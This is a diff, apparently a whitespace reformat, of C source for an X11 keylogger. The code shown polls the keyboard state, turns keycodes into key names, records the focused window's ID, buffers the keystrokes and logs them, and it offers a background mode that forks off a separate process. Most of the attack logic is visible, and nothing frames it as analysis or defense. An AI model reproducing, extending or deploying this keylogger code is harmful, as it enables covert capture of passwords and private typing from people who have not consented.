@@ -24,14 +24,14 @@ void handleArgs(int argc, char* argv[]) {
             background = 1;
         }
 
-		else if ((strcmp(argv[i], "-o") == 0) || (strcmp(argv[i], "--output") == 0)) {
+        else if ((strcmp(argv[i], "-o") == 0) || (strcmp(argv[i], "--output") == 0)) {
             output = 1;
-			if (i + 1 <= argc - 1)  {
+            if (i + 1 <= argc - 1)  {
                 i++;
                 outputfile = argv[i];
             }
             else {
-				printf("Not good.");
+                printf("Not good.");
                 return -1;
             }
         }
@@ -73,7 +73,7 @@ void addParentheses(char **res) {
 void keylogger() {
     BUFFER *b;
     b = initBuffer();
-	Display *display;
+    Display *display;
 
     char keyboardState[32];
     char keyboardStateOld[32] = {0};
@@ -96,19 +96,19 @@ void keylogger() {
         return -1;
     }
 
-	int logging = 0;
+    int logging = 0;
 
     while(1)
-    {	
+    {   
         usleep(SLEEP);
-		if ((logging == 1) && ((time(NULL) > timeout) || (focusWin != oldfocusWin))) {
-			logging = 0;
-			Log(" [%x] %s\n", focusWin, b->buffer);
+        if ((logging == 1) && ((time(NULL) > timeout) || (focusWin != oldfocusWin))) {
+            logging = 0;
+            Log(" [%x] %s\n", focusWin, b->buffer);
             emptyData(b);
-		}
-			
+        }
+            
         XQueryKeymap(display, keyboardState);
-		
+        
         if (memcmp(keyboardState, keyboardStateOld, 32) != NULL) {
             
             /*
@@ -116,7 +116,7 @@ void keylogger() {
             pic = XGetImage(display, RootWindow(display, DefaultScreen(display)), 10, 10, 201, 201, AllPlanes, ZPixmap);   
             */
 
-			int i = 0, j = 0;
+            int i = 0, j = 0;
 
             for(i = 0; i < sizeof( keyboardState ); i++) {
                 bit = keyboardState[i];
@@ -124,57 +124,56 @@ void keylogger() {
                 iCheck = 1;
 
                 for ( j = 0 ; j < 8 ; j++ ) {
-                     if ((bit & iCheck) && !(bitOld & iCheck)) {
-                         keyCode = i * 8 + j;
+                    if ((bit & iCheck) && !(bitOld & iCheck)) {
+                        keyCode = i * 8 + j;
 
-                         keyboardStatesym = XkbKeycodeToKeysym(display, keyCode, 0, 0);
-                         keyboardStateString = XKeysymToString(keyboardStatesym);
+                        keyboardStatesym = XkbKeycodeToKeysym(display, keyCode, 0, 0);
+                        keyboardStateString = XKeysymToString(keyboardStatesym);
 
-					     if (keyboardStateString == NULL) { 
-							switch (keyCode) {
-								case 22:
-									keyboardStateString = "backspace";
-									break;
-								case 36:
-									keyboardStateString = "enter";
-									break;
-								default:
-									keyboardStateString = "unknown";
-							}
-						}
+                        if (keyboardStateString == NULL) { 
+                            switch (keyCode) {
+                                case 22:
+                                    keyboardStateString = "backspace";
+                                    break;
+                                case 36:
+                                    keyboardStateString = "enter";
+                                    break;
+                                default:
+                                    keyboardStateString = "unknown";
+                            }
+                        }
 
-						if (strlen(keyboardStateString) > 1) {
-							addParentheses(&keyboardStateString);
+                        if (strlen(keyboardStateString) > 1) {
+                            addParentheses(&keyboardStateString);
                             needToFree = 1;
-						}
+                        }
 
-
-						 // Get current active window
-						oldfocusWin = focusWin;
+                         // Get current active window
+                        oldfocusWin = focusWin;
                         XGetInputFocus(display, &focusWin, &iReverToReturn);
 
-						if (!background) {
-							printf( "WindowID %x Key: %s Code: %i\n", focusWin, keyboardStateString, keyCode );
-						}
+                        if (!background) {
+                            printf( "WindowID %x Key: %s Code: %i\n", focusWin, keyboardStateString, keyCode );
+                        }
 
                         if (focusWin != oldfocusWin) {
-			                Log("change [%x] %s\n", focusWin, b->buffer);
+                            Log("change [%x] %s\n", focusWin, b->buffer);
                             emptyData(b);
-		                }
-						
+                        }
+
 
                         addData(b, keyboardStateString);
                         //printf("Contents of buffer: %s", b->buffer);
 
-						timeout = time(NULL) + INTERVALOFINACTIVITY;
-						logging = 1;
+                        timeout = time(NULL) + INTERVALOFINACTIVITY;
+                        logging = 1;
 
                         if (needToFree) {
                             free(keyboardStateString);
                             needToFree = 0;
                         }
 
-                     }
+                    }
                     iCheck = iCheck << 1 ;
                 }
             }
@@ -201,14 +200,14 @@ void createProccess() {
     }
 }
 
-int main(int argc, char *argv[]) {	
+int main(int argc, char *argv[]) {  
     
-	handleArgs(argc, argv);
+    handleArgs(argc, argv);
 
-	if (background) {
+    if (background) {
         createProccess();
-	}
-	else {
-		keylogger();
-	}
+    }
+    else {
+        keylogger();
+    }
 }
